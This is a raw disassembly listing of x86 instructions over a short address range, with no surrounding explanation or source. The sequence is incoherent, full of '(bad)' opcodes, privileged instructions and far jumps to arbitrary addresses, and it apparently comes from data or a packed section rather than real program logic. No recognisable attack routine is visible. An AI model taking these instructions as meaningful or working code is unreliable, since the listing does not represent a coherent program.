  42569f:	adc    DWORD PTR [eax-0x5ea21c9b],ebp
  4256a5:	xchg   ecx,eax
  4256a6:	ins    BYTE PTR es:[edi],dx
  4256a7:	xchg   ebp,eax
  4256a8:	mov    cl,0x9e
  4256aa:	out    dx,al
  4256ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256ac:	pushf  
  4256ad:	loope  0x4256af
	...
  4256b7:	add    BYTE PTR [eax],al
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	in     eax,dx
  4256c7:	pop    edx
  4256c8:	jmp    0x4256ea
  4256ca:	jo     0x42569a
  4256cc:	add    DWORD PTR [eax],eax
  4256ce:	cld    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    BYTE PTR [edi],ah
  4256d3:	adc    al,0x3d
  4256d5:	out    dx,al
  4256d6:	js     0x42573a
  4256d8:	rol    DWORD PTR [bx+di-0x67],cl
  4256dc:	sbb    BYTE PTR [esi+0x30],cl
  4256df:	jbe    0x4256ed
  4256e1:	mov    ah,0x28
  4256e3:	push   ebp
  4256e4:	adc    al,0x25
  4256e6:	nop
  4256e7:	stos   DWORD PTR es:[edi],eax
  4256e8:	je     0x425696
  4256ea:	push   esp
  4256eb:	mov    ch,0x15
  4256ed:	mov    ebx,0x7eb9d1cc
  4256f2:	aad    0x1d
  4256f4:	sub    al,0x3b
  4256f6:	adc    DWORD PTR [edx],0xffffff94
  4256f9:	jno    0x4256d4
  4256fb:	xor    esi,DWORD PTR [edx]
  4256fd:	shr    DWORD PTR [esi-0xf71526c],1
  425703:	aad    0x3
  425705:	mov    al,0xf7
  425707:	call   0x73032c98
  42570c:	sbb    al,0x32
  42570e:	es cli 
  425710:	pop    ecx
  425711:	jl     0x42576a
  425713:	and    ah,bh
  425715:	retf   
  425716:	shl    ebp,cl
  425718:	jnp    0x425786
  42571a:	mov    ds:0x2628528a,eax
  42571f:	push   0xab00cdb9
  425724:	retf   0xcb0d
  425727:	inc    eax
  425728:	add    edx,DWORD PTR [ecx-0x291d7077]
  42572e:	jne    0x4256c2
  425730:	rol    DWORD PTR [eax],1
  425732:	sub    al,0xaa
  425734:	icebp  
  425735:	and    DWORD PTR [ecx],0xffffffaf
  425738:	arpl   WORD PTR [eax-0x527a68b5],di
  42573e:	bound  esi,QWORD PTR [ebx-0x6018ab43]
  425744:	mov    al,0x39
  425746:	shl    DWORD PTR [edi+0x1d5c5285],cl
  42574c:	mov    cl,0x2a
  42574e:	(bad)  
  42574f:	neg    BYTE PTR [ebp+eax*8+0x49]
  425753:	inc    ebp
  425754:	xor    DWORD PTR [ebx+0x28beb7aa],0x21
  42575b:	push   0x3d4b4c28
  425760:	dec    DWORD PTR [edi+0x27]
  425763:	fistp  DWORD PTR [ecx+0x2097f165]
  425769:	jg     0x4256ef
  42576b:	cs enter 0x139f,0x3a
  425770:	repnz pop ecx
  425772:	push   ss
  425773:	fidiv  WORD PTR [edx-0x39]
  425776:	xchg   esi,eax
  425777:	lock je 0x42577e
  42577a:	ret    
  42577b:	not    DWORD PTR [eax+0x10]
  42577e:	inc    edx
  42577f:	inc    ebp
  425780:	jge    0x425798
  425782:	sub    dh,BYTE PTR [ebp+edx*8-0x3a]
  425786:	jnp    0x4257fe
  425788:	sub    dl,BYTE PTR [ebp+ecx*1-0x407e2db3]
  42578f:	neg    BYTE PTR [eax]
  425791:	(bad)  
  425793:	js     0x425731
  425795:	push   edx
  425796:	mov    ds:0x14526236,al
  42579b:	ds pushf 
  42579d:	pop    ecx
  42579e:	mov    eax,0xdbda4349
  4257a3:	jno    0x42575e
  4257a5:	or     eax,0xb544166f
  4257aa:	cmp    cl,BYTE PTR [edi+eax*2]
  4257ad:	inc    edi
  4257ae:	dec    eax
  4257af:	jl     0x42580a
  4257b1:	sbb    ah,dl
  4257b3:	sti    
  4257b4:	or     edi,ebp
  4257b6:	mov    eax,ds:0x5c2ae582
  4257bb:	idiv   DWORD PTR [eax-0x71240b00]
  4257c1:	jne    0x42579b
  4257c3:	jo     0x425773
  4257c5:	scas   al,BYTE PTR es:[edi]
  4257c6:	jae    0x425841
  4257c8:	cs adc al,0xbf
  4257cb:	outs   dx,BYTE PTR ds:[esi]
  4257cc:	lods   al,BYTE PTR ds:[esi]
  4257cd:	add    DWORD PTR [ecx-0x2b6c4ee8],0xfffffff6
  4257d4:	pushf  
  4257d5:	mov    cl,0x37
  4257d7:	jo     0x425799
  4257d9:	cdq    
  4257da:	dec    esp
  4257db:	push   esi
  4257dc:	std    
  4257dd:	pop    ebp
  4257de:	jno    0x4257cb
  4257e0:	int    0x94
  4257e2:	xchg   edi,eax
  4257e3:	cmp    eax,0x92bb274e
  4257e8:	in     al,dx
  4257e9:	pop    eax
  4257ea:	mov    esi,0x4ebdf16e
  4257ef:	xchg   ebx,eax
  4257f0:	inc    ebx
  4257f1:	and    al,0x6f
  4257f3:	jmp    0x6177:0xeb99aa3c
  4257fa:	popf   
  4257fb:	imul   DWORD PTR [ecx]
  4257fd:	pop    esi
  4257fe:	mov    edx,edx
  425800:	sub    ah,0xd2
  425803:	sbb    edi,eax
  425805:	pop    ss
  425806:	gs cmc 
  425808:	jle    0x425877
  42580a:	repnz and ah,BYTE PTR [ebx+ecx*2]
  42580e:	fwait
  42580f:	gs dec edx
  425811:	das    
  425812:	pop    esp
  425813:	jl     0x4257ca
  425815:	cli    
  425816:	dec    edi
  425817:	sub    ebp,DWORD PTR [esi+ebp*8]
  42581a:	pop    ss
  42581b:	pop    es
  42581c:	les    esi,FWORD PTR [ebp-0xf0a8d8f]
  425822:	sti    
  425823:	(bad)  
  425825:	lea    ebx,[edi+eiz*8]
  425828:	pop    esp
  425829:	mov    ebp,?
  42582b:	mov    esi,0xc1a39dc4
  425830:	dec    eax
  425831:	push   ecx
  425832:	pop    edi
  425833:	lea    eax,[esi-0x3a1d72f]
  425839:	jb     0x4257cf
  42583b:	push   0xffffffdf
  42583d:	lea    esi,[ecx-0x66]
  425840:	xchg   esp,eax
  425841:	std    
  425842:	aad    0x82
  425844:	repz adc al,BYTE PTR [ebx]
  425847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425848:	adc    BYTE PTR [edi-0x6d],dl
  42584b:	cdq    
  42584c:	scas   eax,DWORD PTR es:[edi]
  42584d:	arpl   WORD PTR [edi+ecx*8+0x39],di
  425851:	mov    esp,0xfaf7eb87
  425856:	sbb    esi,ebx
  425858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425859:	(bad)  
  42585a:	(bad)  
  42585b:	sbb    eax,0xacb4a1ad
  425860:	adc    BYTE PTR [esi-0x34],dh
  425863:	cdq    
  425864:	inc    esp
  425865:	inc    eax
  425866:	test   ebp,ebp
  425868:	inc    esp
  425869:	or     edi,0x50
  42586c:	test   BYTE PTR [edx-0xc],dh
  42586f:	add    DWORD PTR [edx+0x56d53536],esp
  425875:	inc    eax
  425876:	cs mov ah,0x31
  425879:	ins    DWORD PTR es:[edi],dx
  42587a:	mov    ah,0x21
  42587c:	les    ecx,FWORD PTR [ebx+0x72da87ff]
  425882:	data16 xor cl,BYTE PTR [esi]
  425885:	jecxz  0x4258ae
  425887:	mov    dl,0x45
  425889:	call   0x45653474
  42588e:	sbb    DWORD PTR [edi-0x7a],eax
  425891:	pop    esp
  425892:	or     BYTE PTR [esi],al
  425894:	mov    edi,0x223c0313
  425899:	xor    eax,0x549562f
  42589e:	mov    esi,0x7641fc66
  4258a3:	pop    esp
  4258a4:	test   al,0x8d
  4258a6:	ja     0x42589a
  4258a8:	mov    ebp,0x6b3fcf86
  4258ad:	push   eax
  4258ae:	icebp  
  4258af:	fadd   st(3),st
  4258b1:	and    DWORD PTR [esi+0x68],0x7f
  4258b5:	mov    cl,0xc9
  4258b7:	add    dh,ch
  4258b9:	scas   eax,DWORD PTR es:[edi]
  4258ba:	out    dx,eax
  4258bb:	inc    ebp
  4258bc:	inc    edx
  4258bd:	or     eax,0x132ac547
  4258c2:	int    0x0
  4258c4:	call   ebp
  4258c6:	test   al,0x18
  4258c8:	(bad)  
  4258c9:	scas   al,BYTE PTR es:[edi]
  4258ca:	iret   
  4258cb:	mov    esp,0x4f79
	...
  4258d8:	add    BYTE PTR [eax],al
  4258da:	dec    ebx
  4258db:	inc    ebp
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	adc    DWORD PTR [esi-0x4d],esi
  4258e9:	imul   ebp,DWORD PTR [eax+edx*8+0x1],0x0
  4258ee:	cld    
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    dh,bl
  4258f3:	mov    ah,0xc5
  4258f5:	mov    dl,0x2
  4258f7:	cmp    ebx,DWORD PTR [esi+edx*1-0x15]
  4258fb:	xor    DWORD PTR [esi-0x2eb69675],0x3c0d99b4
  425905:	xchg   ecx,eax
  425906:	mov    ch,0x51
  425908:	in     eax,0xac
  42590a:	stos   BYTE PTR es:[edi],al
  42590b:	or     al,0xac
  42590d:	jo     0x42591c
  42590f:	xchg   ecx,eax
  425910:	arpl   WORD PTR [esi],cx
  425912:	dec    ebp
  425913:	jg     0x4258c5
  425915:	ss das 
  425917:	xchg   edx,eax
  425918:	test   DWORD PTR ds:0xebc4910f,0xed8f035c
  425922:	test   al,0x19
  425924:	outs   dx,DWORD PTR ds:[esi]
  425925:	clc    
  425926:	(bad)  
  425927:	retf   
  425928:	ret    
  425929:	addr16 icebp 
  42592b:	xchg   BYTE PTR [edi],cl
  42592d:	aam    0x2d
  42592f:	dec    esp
  425930:	pop    es
  425931:	ds je  0x425920
  425934:	es retf 0x4b3c
  425938:	sti    
  425939:	and    eax,0x8e2a5731
  42593e:	pop    ebp
  42593f:	dec    edx
  425940:	retf   0xc0c1
  425943:	addr16 pop ecx
  425945:	inc    ebp
  425946:	ror    al,1
  425948:	in     eax,0xe5
  42594a:	mov    dh,0xf3
  42594c:	sar    edi,0x44
  42594f:	or     bl,BYTE PTR [edi+eax*4-0x1c]
  425953:	add    DWORD PTR [ecx],esi
  425955:	inc    eax
  425956:	cmp    eax,0xf6980534
  42595b:	jmp    0x42590c
  42595d:	lods   al,BYTE PTR ds:[esi]
  42595e:	or     eax,ebx
  425960:	push   esi
  425961:	push   ebx
  425962:	aam    0x5a
  425964:	jno    0x42591e
  425966:	and    esi,edx
  425968:	popa   
  425969:	add    BYTE PTR [eax],bh
  42596b:	push   edx
  42596c:	scas   al,BYTE PTR es:[edi]
  42596d:	mov    cl,0xe0
  42596f:	mov    DWORD PTR [ecx+0x1f],esi
  425972:	push   eax
  425973:	add    BYTE PTR [edx+esi*1],0xfe
  425977:	or     ebx,esi
  425979:	dec    eax
  42597a:	cdq    
  42597b:	sbb    cl,ah
  42597d:	push   eax
  42597e:	jl     0x42599c
  425980:	add    ecx,DWORD PTR [eax-0x54bcee69]
  425986:	mov    al,0x64
  425988:	jecxz  0x425992
  42598a:	stos   BYTE PTR es:[edi],al
  42598b:	add    al,0x73
  42598d:	inc    ebp
  42598e:	jb     0x42595c
  425990:	stos   BYTE PTR es:[edi],al
  425991:	rol    DWORD PTR [edi+0x0],cl
  425994:	imul   esi,DWORD PTR [esi+0x3d],0x778ed59
  42599b:	jmp    0xe47eb4be
  4259a0:	test   eax,ebp
  4259a2:	rcr    BYTE PTR ds:0x8266eb96,1
  4259a8:	inc    esp
  4259a9:	xlat   BYTE PTR ds:[ebx]
  4259aa:	inc    edi
  4259ab:	into   
  4259ac:	xor    edi,DWORD PTR [ecx+ecx*4-0x1de9e21e]
  4259b3:	fld    QWORD PTR [eax+0xf]
  4259b6:	xchg   ebx,eax
  4259b7:	cmp    ch,BYTE PTR [ecx+edx*2+0x8]
  4259bb:	cmp    DWORD PTR [ecx+0x42],esi
  4259be:	ret    0xa6d8
  4259c1:	enter  0xd494,0x4f
  4259c5:	out    dx,al
  4259c6:	scas   al,BYTE PTR es:[edi]
  4259c7:	pop    ebx
  4259c8:	push   es
  4259c9:	pop    ecx
  4259ca:	dec    ecx
  4259cb:	nop
  4259cc:	xchg   esi,eax
  4259cd:	push   eax
  4259ce:	or     bl,BYTE PTR [edx]
  4259d0:	sub    bh,BYTE PTR [edi]
  4259d2:	mov    ebx,0x23a0d60c
  4259d7:	push   eax
  4259d8:	push   edi
  4259d9:	sub    DWORD PTR [ebp+0x3d],ecx
  4259dc:	push   eax
  4259dd:	stc    
  4259de:	(bad)  
  4259df:	lds    eax,FWORD PTR [ecx]
  4259e1:	leave  
  4259e2:	push   esi
  4259e3:	pushf  
  4259e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259e5:	push   0x93751c44
  4259ea:	jmp    0xd5:0xa09d5934
  4259f1:	es xchg edi,eax
  4259f3:	jae    0x4259a3
  4259f5:	inc    ebx
  4259f6:	and    al,0x82
  4259f9:	jb     0x4259ec
  4259fb:	scas   al,BYTE PTR es:[edi]
  4259fc:	out    dx,al
  4259fd:	and    BYTE PTR [ebx+0x27],dl
  425a00:	sbb    al,0xd0
  425a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a03:	sahf   
  425a04:	and    DWORD PTR [edi],eax
  425a06:	ja     0x4259b8
  425a08:	mov    esp,0xc7ea28e5
  425a0d:	sub    DWORD PTR [edi+0x2c],eax
  425a10:	dec    esi
  425a11:	scas   al,BYTE PTR es:[edi]
  425a12:	aam    0x9b
  425a14:	mov    bl,0x46
  425a16:	sub    DWORD PTR [edi+0x3ccad6c6],ebp
  425a1c:	fild   DWORD PTR [edx*2-0xa0bb325]
  425a23:	and    al,0x91
  425a25:	pop    ebx
  425a26:	push   ebx
  425a27:	xchg   ebx,eax
  425a28:	add    al,0x29
  425a2a:	inc    ebx
  425a2b:	xchg   esp,eax
  425a2c:	inc    ebp
  425a2d:	sbb    DWORD PTR [eax],edi
  425a2f:	imul   eax,ecx,0x931220e8
  425a35:	sub    BYTE PTR [edx-0x5c],bh
  425a38:	enter  0xa211,0x7b
  425a3c:	das    
  425a3d:	inc    edi
  425a3e:	es je  0x425a26
  425a41:	and    cl,ah
  425a43:	and    al,0xcf
  425a45:	add    al,0x3
  425a47:	ss out 0x17,eax
  425a4a:	ds push es
  425a4c:	mov    DWORD PTR [edi+0x73],ebx
  425a4f:	int    0xcc
  425a51:	inc    ebp
  425a52:	sbb    al,0x16
  425a54:	jmp    0x43acb7b4
  425a59:	mov    eax,ds:0x4b867e49
  425a5e:	into   
  425a5f:	ret    
  425a60:	pop    ds
  425a61:	pop    es
  425a62:	das    
  425a63:	shr    bh,1
  425a65:	sbb    DWORD PTR [edi+0x3e],edi
  425a68:	pop    ss
  425a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a6a:	iret   
  425a6b:	test   BYTE PTR [esi],0xe5
  425a6e:	jmp    0x1960:0x4c32ed39
  425a75:	sub    BYTE PTR [ebx+0x32],0xe
  425a79:	mov    bh,0xe2
  425a7b:	mov    ds:0x74bdb879,eax
  425a80:	push   es
  425a81:	add    eax,0xc9e96aa2
  425a86:	cmp    dl,BYTE PTR [ebx-0x22]
  425a89:	rcl    BYTE PTR [ebx],1
  425a8b:	enter  0x6c5f,0x62
  425a8f:	add    eax,0x15482635
  425a94:	sbb    al,0xdb
  425a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a97:	mov    ?,WORD PTR ds:0x4765ce00
  425a9d:	push   edx
  425a9f:	retf   0xbe64
  425aa2:	adc    eax,0xcf8edfe
  425aa7:	cmp    eax,0x8fc35270
  425aac:	cmc    
  425aad:	mov    dl,0x84
  425aaf:	test   DWORD PTR [ecx-0x52b42ac7],eax
  425ab5:	pop    ds
  425ab6:	mov    esp,0x4ec662f4
  425abb:	pop    ebp
  425abc:	outs   dx,DWORD PTR ds:[esi]
  425abd:	pop    esp
  425abe:	jle    0x425acf
  425ac0:	ja     0x425af9
  425ac2:	jo     0x425b43
  425ac4:	hlt    
  425ac5:	jmp    0x425ab5
  425ac7:	rcr    dh,cl
  425ac9:	lock int 0x67
  425acc:	xor    eax,0x48568d10
  425ad1:	imul   ebx,esp,0xffffffe6
  425ad4:	in     al,dx
  425ad5:	mov    eax,0xff262ca1
  425ada:	aam    0xa8
  425adc:	lea    eax,[edi-0xb]
  425adf:	pop    ebx
  425ae0:	jmp    0x58b6:0xf97b0c26
  425ae7:	arpl   WORD PTR [edi-0x6eb83bc7],ax
  425aed:	mov    ebp,0x0
	...
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	pop    edi
  425b07:	sub    BYTE PTR [eax+0x1d26896],ah
  425b0d:	add    ah,bh
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [ecx+0x5d57f7d],bh
  425b17:	stos   DWORD PTR es:[edi],eax
  425b18:	(bad)  
  425b1a:	enter  0x476b,0xcc
  425b1e:	cwde   
  425b1f:	and    eax,DWORD PTR [edi+0x487f3440]
  425b25:	mov    bl,0x8d
  425b27:	push   esi
  425b28:	rcl    dl,0xc1
  425b2b:	mov    dl,0xd8
  425b2d:	lds    esp,FWORD PTR [ecx-0x5]
  425b30:	adc    esp,edx
  425b32:	test   eax,0x210de8c3
  425b37:	pop    edi
  425b38:	jmp    0x425b86
  425b3a:	or     ch,BYTE PTR [ebp+0x1e]
  425b3d:	xorps  xmm5,XMMWORD PTR [esp+esi*4+0x5]
  425b42:	sbb    dl,BYTE PTR [ebx-0x69]
  425b45:	jnp    0x425bc2
  425b47:	jl     0x425b5c
  425b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b4a:	in     al,0xa8
  425b4c:	sti    
  425b4d:	dec    ecx
  425b4e:	int3   
  425b4f:	int3   
  425b50:	sbb    eax,0x8a11c524
  425b55:	cld    
  425b56:	in     eax,dx
  425b57:	stc    
  425b58:	shl    ch,1
  425b5a:	loope  0x425b25
  425b5c:	inc    edi
  425b5d:	ins    BYTE PTR es:[edi],dx
  425b5e:	push   cs
  425b5f:	inc    ebp
  425b60:	xchg   edi,eax
  425b61:	in     eax,dx
  425b62:	cmc    
  425b63:	adc    eax,0xf9d8f3ab
  425b68:	int3   
  425b69:	int    0xba
  425b6b:	push   ebx
  425b6c:	lahf   
  425b6d:	std    
  425b6e:	push   esp
  425b6f:	pop    esi
  425b70:	retf   0xd416
  425b73:	and    ah,BYTE PTR [ebx]
  425b75:	dec    edi
  425b76:	jecxz  0x425b46
  425b78:	add    edx,DWORD PTR [edx-0x4e67aa92]
  425b7e:	sar    DWORD PTR [esi],0xc2
  425b81:	xor    ecx,ebx
  425b83:	dec    edi
  425b84:	inc    eax
  425b85:	ins    BYTE PTR es:[edi],dx
  425b86:	out    0x43,eax
  425b88:	xor    al,0xd9
  425b8a:	pop    ebx
  425b8b:	fcomp  QWORD PTR [edi]
  425b8d:	jae    0x425ba0
  425b8f:	xchg   ebp,eax
  425b90:	lds    edx,FWORD PTR ds:0xb2582955
  425b96:	mov    edi,0x96edd7e1
  425b9b:	fwait
  425b9c:	pusha  
  425b9d:	out    dx,eax
  425b9e:	sbb    ecx,DWORD PTR ds:0x68b62ef1
  425ba4:	fcomp  QWORD PTR [edx]
  425ba6:	dec    ecx
  425ba7:	push   esi
  425ba8:	adc    al,0x37
  425baa:	imul   eax,DWORD PTR [edx],0xffffffd7
  425bad:	push   es
  425bae:	pop    edi
  425baf:	mov    ds:0x6a8627f6,al
  425bb4:	mov    ah,0x3d
  425bb6:	enter  0xf663,0xd7
  425bba:	and    dl,ch
  425bbc:	push   eax
  425bbd:	cli    
  425bbe:	(bad)  
  425bbf:	xor    bh,BYTE PTR ds:0x74b16988
  425bc5:	and    esp,edx
  425bc7:	mov    edi,0xd74dfb05
  425bcc:	dec    edi
  425bcd:	retf   
  425bce:	ja     0x425b9a
  425bd0:	jmp    0xd9a4e10b
  425bd5:	ss jmp 0xabbc:0x1da266e9
  425bdd:	js     0x425bad
  425bdf:	inc    esp
  425be0:	in     al,dx
  425be1:	jae    0x425bde
  425be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425be4:	jnp    0x425be0
  425be6:	or     al,BYTE PTR [edi+0x332962b6]
  425bec:	sub    ebp,DWORD PTR [esi-0x49]
  425bef:	push   ebx
  425bf0:	xchg   esp,eax
  425bf1:	in     eax,dx
  425bf2:	(bad)  
  425bf3:	mov    ecx,0xda8a3495
  425bf8:	loope  0x425ba9
  425bfa:	stos   BYTE PTR es:[edi],al
  425bfb:	ret    
  425bfc:	ret    0x3e9a
  425bff:	sbb    eax,0xbe4cfad0
  425c04:	pop    ss
  425c05:	lods   al,BYTE PTR ds:[esi]
  425c06:	mov    ah,0x3c
  425c08:	dec    eax
  425c09:	std    
  425c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c0b:	push   ebx
  425c0c:	sbb    cl,BYTE PTR [ecx+ebx*1-0xcfad698]
  425c13:	mov    edx,0x7b947083
  425c18:	jle    0x425c5f
  425c1a:	cmp    al,0x37
  425c1c:	cld    
  425c1d:	repnz xor eax,0x50a69c92
  425c23:	(bad)  [eax+edi*1+0x4931c9b7]
  425c2a:	ss aad 0xee
  425c2d:	pop    ecx
  425c2e:	outs   dx,BYTE PTR ds:[esi]
  425c2f:	jl     0x425c1c
  425c31:	out    0xe1,al
  425c33:	dec    esp
  425c34:	test   DWORD PTR [edi+0x3eedc7d2],ecx
  425c3a:	popa   
  425c3b:	cmp    ah,bl
  425c3d:	adc    DWORD PTR [edi-0x68],0xbe55c97
  425c44:	les    esi,FWORD PTR [ebp-0x7807fbb7]
  425c4a:	or     al,BYTE PTR [esi-0x6c]
  425c4d:	sti    
  425c4e:	hlt    
  425c4f:	sub    al,0x5c
  425c51:	cwde   
  425c52:	push   es
  425c53:	aam    0x53
  425c55:	add    BYTE PTR [esi-0x240e8940],dl
  425c5b:	inc    esi
  425c5c:	jo     0x425c16
  425c5e:	pop    edi
  425c5f:	cmp    eax,0xf6f31ba
  425c64:	imul   ecx,DWORD PTR [edx],0x7c
  425c67:	fild   QWORD PTR [ecx+esi*8-0x7]
  425c6b:	out    0x2,eax
  425c6d:	nop
  425c6e:	stc    
  425c6f:	out    dx,al
  425c70:	jmp    0x48ed:0x221e0896
  425c77:	dec    edx
  425c78:	xchg   edx,eax
  425c79:	push   ebp
  425c7a:	idiv   BYTE PTR [eax-0x51c33d95]
  425c80:	adc    DWORD PTR [ecx-0x252a175],0x7f3b8432
  425c8a:	sbb    al,0x2f
  425c8c:	int    0xe
  425c8e:	jp     0x425cc4
  425c90:	daa    
  425c91:	in     eax,0x61
  425c93:	(bad)  
  425c94:	aad    0xb2
  425c96:	mov    edx,esp
  425c98:	mov    esp,0x66d5cc04
  425c9d:	nop
  425c9e:	push   esp
  425c9f:	adc    esi,ecx
  425ca1:	sbb    eax,0xf4c24639
  425ca6:	inc    ebp
  425ca7:	scas   eax,DWORD PTR es:[edi]
  425ca8:	mov    cl,0x29
  425caa:	clc    
  425cab:	mov    bh,0xcf
  425cad:	cmp    esp,ebp
  425caf:	mov    dl,0x25
  425cb1:	and    ecx,ebx
  425cb3:	bound  ebp,QWORD PTR [ebx+ecx*4-0x5d]
  425cb7:	cmp    BYTE PTR [eax+ecx*4],dh
  425cba:	lds    ebp,FWORD PTR [ebx+eiz*2-0x55]
  425cbe:	dec    ebp
  425cbf:	daa    
  425cc0:	and    esi,DWORD PTR [ecx+0x7d045188]
  425cc6:	jge    0x425cba
  425cc8:	aam    0x73
  425cca:	adc    DWORD PTR [eax-0x3e36d28f],edx
  425cd0:	push   es
  425cd1:	dec    edi
  425cd2:	lods   al,BYTE PTR ds:[esi]
  425cd3:	lahf   
  425cd4:	out    dx,al
  425cd5:	cs inc esi
  425cd7:	test   BYTE PTR ds:0xd445bd00,cl
  425cdd:	inc    esi
  425cde:	arpl   WORD PTR [edx-0x6a],si
  425ce1:	dec    ebx
  425ce2:	(bad)  
  425ce3:	cdq    
  425ce4:	jmp    0x425ca1
  425ce6:	inc    edi
  425ce7:	inc    eax
  425ce8:	inc    edi
  425ce9:	outs   dx,DWORD PTR ds:[esi]
  425cea:	xor    ecx,0xcd1d556a
  425cf0:	clts   
  425cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cf3:	scas   eax,DWORD PTR es:[edi]
  425cf4:	jecxz  0x425c8b
  425cf6:	or     ch,al
  425cf8:	pop    ss
  425cf9:	mov    ecx,0x2d8857c
  425cfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cff:	xchg   edi,eax
  425d00:	mov    edi,0x9bce9f2f
  425d05:	xor    DWORD PTR [edx+ebx*2+0x587a5c73],esi
  425d0c:	aaa    
  425d0d:	mov    WORD PTR [eax],es
	...
  425d17:	add    BYTE PTR [eax],al
  425d19:	add    BYTE PTR [edx-0x79],cl
  425d1c:	push   edx
  425d1d:	dec    esp
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x3492def1],ecx
  425d27:	xor    eax,0xd464a055
  425d2c:	add    DWORD PTR [eax],eax
  425d2e:	cld    
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [eax-0x4a537560],ah
  425d37:	fstp   TBYTE PTR [ebp-0x19]
  425d3a:	out    0xf0,al
  425d3c:	cmp    BYTE PTR [ebx-0xf],ch
  425d3f:	pop    ss
  425d40:	pop    esi
  425d41:	push   ds
  425d42:	(bad)  
  425d44:	hlt    
  425d45:	sbb    al,0x27
  425d47:	int3   
  425d48:	push   cs
  425d49:	mov    al,ds:0xb126ecb1
  425d4e:	or     edi,DWORD PTR [edx-0x26]
  425d51:	push   edi
  425d52:	enter  0xf49f,0x95
  425d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d57:	enter  0x72b1,0xe7
  425d5b:	ror    ah,1
  425d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d5e:	adc    ah,bl
  425d60:	test   DWORD PTR [eax],ecx
  425d62:	mul    DWORD PTR ds:0xc1bf768b
  425d68:	mov    cl,0x31
  425d6a:	dec    esi
  425d6b:	dec    esi
  425d6c:	mov    esp,0x7a61d154
  425d71:	call   0xa31b:0xfca764ee
  425d78:	lods   al,BYTE PTR ds:[esi]
  425d79:	leave  
  425d7a:	cmc    
  425d7b:	(bad)  
  425d7d:	cli    
  425d7e:	pop    ebx
  425d7f:	(bad)  
  425d81:	jg     0x425d15
  425d83:	mov    al,ds:0xe6634a04
  425d88:	(bad)  
  425d89:	add    cl,dh
  425d8b:	xchg   ebx,eax
  425d8c:	or     eax,0xc95740f
  425d91:	sub    DWORD PTR [ebp+0xbc61867],0x4f84b63e
  425d9b:	test   al,0x67
  425d9d:	xor    eax,0x18585247
  425da2:	mov    bl,0x95
  425da4:	leave  
  425da5:	jbe    0x425e1c
  425da7:	in     al,dx
  425da8:	add    BYTE PTR [ecx-0x1e],cl
  425dab:	(bad)  
  425dac:	jmp    0xd6d76633
  425db1:	ins    DWORD PTR es:[edi],dx
  425db2:	sub    edx,DWORD PTR [ebx-0xc]
  425db5:	in     ax,dx
  425db7:	cdq    
  425db8:	pop    esp
  425db9:	xchg   esi,eax
  425dba:	push   0xffffffbd
  425dbc:	dec    esi
  425dbd:	push   cs
  425dbe:	bound  edi,QWORD PTR [ecx+eax*4+0x43]
  425dc2:	cmp    DWORD PTR [edx+0x46],ebx
  425dc5:	jge    0x425e31
  425dc7:	rsm    
  425dc9:	mov    bl,0xb9
  425dcb:	call   0x7e81:0xa56f14e1
  425dd2:	hlt    
  425dd3:	cmp    bh,BYTE PTR [edx+eax*8-0x13042898]
  425dda:	jmp    0x425d66
  425ddc:	adc    al,0xf0
  425dde:	jge    0x425d88
  425de0:	adc    BYTE PTR ds:0x48e35a43,dl
  425de6:	cmp    al,0xc
  425de8:	add    eax,0x984280c7
  425ded:	outs   dx,DWORD PTR ds:[esi]
  425dee:	iret   
  425def:	loop   0x425e15
  425df1:	sbb    DWORD PTR [ebp-0x7540094f],ebp
  425df7:	dec    edi
  425df8:	dec    ecx
  425df9:	arpl   ax,si
  425dfb:	dec    ecx
  425dfc:	loop   0x425da7
  425dfe:	mov    ecx,0x318541df
  425e03:	test   dh,al
  425e05:	popf   
  425e06:	cmp    DWORD PTR [ebx+ebp*1],ebp
  425e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e0b:	mov    ebx,0xd4654c69
  425e10:	mov    ch,0x9b
  425e12:	dec    ebx
  425e13:	in     eax,0x68
  425e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e16:	mul    eax
  425e18:	stos   BYTE PTR es:[edi],al
  425e19:	ret    0x790c
  425e1c:	mov    gs,WORD PTR [edi+ebx*8+0x38]
  425e20:	hlt    
  425e21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e22:	or     BYTE PTR [edi],bh
  425e24:	ds pop eax
  425e26:	sub    al,0x33
  425e28:	jmp    0x425e61
  425e2a:	lahf   
  425e2b:	inc    edx
  425e2c:	cmp    BYTE PTR [ebx-0x625b6290],0x28
  425e33:	sbb    ecx,edx
  425e35:	nop
  425e36:	sti    
  425e37:	xor    cl,ch
  425e39:	in     eax,0xa8
  425e3b:	add    ch,BYTE PTR [edx]
  425e3d:	mov    ebx,0x19ac39a
  425e42:	ins    DWORD PTR es:[edi],dx
